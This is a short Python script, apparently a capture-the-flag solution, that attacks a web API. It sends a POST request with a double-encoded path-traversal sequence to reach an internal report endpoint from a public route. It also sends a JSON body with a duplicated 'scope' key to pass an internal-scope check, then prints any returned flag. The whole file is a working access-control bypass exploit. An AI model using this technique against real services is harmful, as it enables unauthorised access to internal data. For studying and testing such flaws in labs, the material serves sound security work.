#!/usr/bin/env python3
import json
import sys
from urllib.request import Request, urlopen


def main():
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8080"
    target = base + "/api/public/%252e%252e/internal/report"
    body = b'{"scope":"public","scope":"internal"}'

    req = Request(
        target,
        data=body,
        method="POST",
        headers={"Content-Type": "application/json"},
    )

    with urlopen(req, timeout=5) as res:
        raw = res.read().decode()
        print(raw)
        try:
            data = json.loads(raw)
        except Exception:
            return
        if "flag" in data:
            print("[+] flag:", data["flag"])


if __name__ == "__main__":
    main()
